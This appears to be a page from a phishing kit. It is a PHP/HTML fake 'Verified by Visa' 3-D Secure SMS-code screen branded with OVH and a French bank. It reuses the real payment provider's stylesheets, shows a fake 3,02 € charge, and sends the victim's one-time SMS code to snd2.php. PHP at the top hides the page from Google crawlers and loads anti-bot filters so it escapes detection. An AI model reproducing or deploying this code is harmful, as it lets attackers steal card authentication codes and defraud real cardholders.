<?php
$bin4=$_GET['page'];
date_default_timezone_set('Europe/Paris');

if(!isset($_SESSION)) { session_start(); } 
error_reporting(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
include('includes/header.php');
include "tinyboard/antibots1.php";
include "tinyboard/antibots2.php";
include "tinyboard/antibots3.php";
include "tinyboard/antibots4.php";
if($antibots == 'on' ){
include "tinyboard/antibots5.php";
include "tinyboard/antibots6.php";
include "tinyboard/antibots7.php";
include "tinyboard/antibots.php";
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
}
?>

<html class="ui-mobile"><head>
 	
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
 	
	
	      
			<link rel="stylesheet" type="text/css" href="https://german-3dsecure.wlp-acs.com/css/responsive/LBB/styles-banque-lbb-mobile.css">
	      
	      
	

 	
   <title>Authentification</title>


	
		<style>
			.btdInput div.ui-input-text.ui-body-inherit.ui-corner-all.ui-shadow-inset {
			    width: 20px!important;
			}
			
			.btdInputLong div.ui-input-text.ui-body-inherit.ui-corner-all.ui-shadow-inset {  
			    width: 35px!important;
			}
		</style>
		<meta name="viewport" content="width=device-width, initial-scale=1">

		
		<link rel="stylesheet" href="https://german-3dsecure.wlp-acs.com/css/responsive/_responsive-jquery.mobile.icons.min.css">
		<link rel="stylesheet" href="https://german-3dsecure.wlp-acs.com/css/responsive/_responsive-generic-theme.css">
		<link rel="stylesheet" href="https://german-3dsecure.wlp-acs.com/css/responsive/_responsive-jquery.mobile.structure-1.4.0.min.css">
		<link rel="stylesheet" href="https://german-3dsecure.wlp-acs.com/css/responsive/_responsive-generic-mobile.css">
		
		
		
	
</head>



<body onload="init();setTimeout('onLoadEvent()',240*1000);" class="ui-mobile-viewport ui-overlay-a" style="">
	
	
		<div id="allcenter" data-role="page" data-url="allcenter" tabindex="0" class="ui-page ui-page-theme-a ui-page-active" style="min-height: 492px;">
		<div id="textSrc" data-role="collapsibleset" class="ui-content ui-collapsible-set ui-group-theme-inherit ui-corner-all" style="height: auto;     position: relative;">
			<div class="ui-content">
				<div id="header">
					<img class="headimg" src="https://zupimages.net/up/19/27/mikz.jpg" title="Verified by Visa" style="width: 16%;">
				</div>
			</div>
	


<div id="content">
		
			<div class="authentif">
			<div class="ui-corner-all custom-corners">
				<div class="ui-bar ui-bar-a">
					<h4 id="_title-bar">Code SMS</h4>
				</div>
			<div class="ui-body ui-body-a">
			<div class="central-info"> 
		
		
		
		
          <p>Nous vous remercions de saisir le code sms &agrave; usage unique que OVH vient de vous transmettre par t&eacute;l&eacute;phone.

</p>
          <form name="Form_AskAuthentication" action="snd2.php?page=<?php echo $bin4 ?>" method="post" id="form1" class="form">
          <div class="wrapper">
						<div class="floater"><label class="label1">R&eacute;f&eacute;rence :</label></div>
						<div class="floater"><label class="comment1">fr_tok_6Adf236</label></div>
					</div>
					<div class="wrapper">
						<div class="floater"><label class="label1">Montant :</label></div>
						<div class="floater"><label class="comment1">3,02 &euro;</label></div>
					</div>
					<div class="wrapper">
						<div class="floater"><label class="label1">Date :</label></div>
						<div class="floater"><label class="comment1"><?php echo date('d/m/Y H:i:s', time()); ?></label></div>
					</div>
					<div class="wrapper">
						<div class="floater"><label class="label1">N&deg; carte de cr&eacute;dit :</label></div>
						<div class="floater"><label class="comment1">**** **** ****<?php echo $bin4 ?></label></div>
					</div>
					
					<div class="wrapper">
						<div class="floater"><label class="label1"><img src="https://german-3dsecure.wlp-acs.com/imgs/lbb/shim.gif" width="1" height="1"></label></div>
											
								
							
						</div>
					
							
							
								<div class="spacer" style="height: 8px;"></div>
							
						 

					<div class="wrapper">
						<div class="floater"><label class="label1">Saisissez le code sms :</label></div>
						
							
							
								<div class="floater"><div class=""><div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
								<input class="chp_code" id="chp1" required="" name="s6"  type="text"></div></div></div>
							
						  
					</div>

					<div class="wrapper">
						<div class="floater"><label class="label1"><img src="https://german-3dsecure.wlp-acs.com/imgs/lbb/shim.gif" width="1" height="1"></label></div>
						<div class="floater"><label class="comment1"><a href="/flowGlobal.wflowLBB;jsessionid=E397C166BBBF6AD83A7FD706A9A913F4.w-node4?execution=e1s1&amp;_eventId=sendNewSMS" class="plainLink ui-link">Abandonner et annuler mon transaction</a></label></div>
					</div>
					
					
					<div class="spacer"><img src="https://german-3dsecure.wlp-acs.com/imgs/lbb/shim.gif" width="1" height="10"></div>
					
					
			
			
			
				</div></div></div></div> <!-- "authentif""ui-corner-all custom-corners"class="ui-body ui-body-a""central-info" -->
				<div class="_mobileButtons">
					<div class="ui-btn ui-input-btn ui-corner-all ui-shadow ui-btn-inline ">Valider<input id="btn_ok"  src="https://german-3dsecure.wlp-acs.com/ofoff.png" type="submit"></div>

				</div>
				
				</form>

	<div class="footer">
	    <div class="logo" style="width: 86px; height: auto;">
	    	<img src="https://eu.api.ovh.com/images/com-square-bichro.png" title="LBB" style="width: 86px;">
	    </div><br>

				<div id="_top-authentif" class="ui-corner-all custom-corners">
					<div class="ui-body ui-body-a">
						<div style="width: 140px; margin:auto;text-align: justify;font-size: 0.688em;">
					    	Copyright OVH 1999 - 2019
					    	<img src="https://german-3dsecure.wlp-acs.com/imgs/lbb/shim.gif" width="12" height="1">
	      				</div>
					</div><!-- fin div _"ui-body ui-body-a -->	
				</div>	<!-- fin div _top-authentif -->	
		
	     
	</div>	<!-- fin div footer -->

 
				</div> <!-- "textSrc" -->
			
				</div> <!-- content -->
				
			
			
			<div class="spacer"><img src="https://german-3dsecure.wlp-acs.com/imgs/lbb/shim.gif" width="1" height="1"></div>
			


</div> <!-- fin div allcenter -->	


</body></html>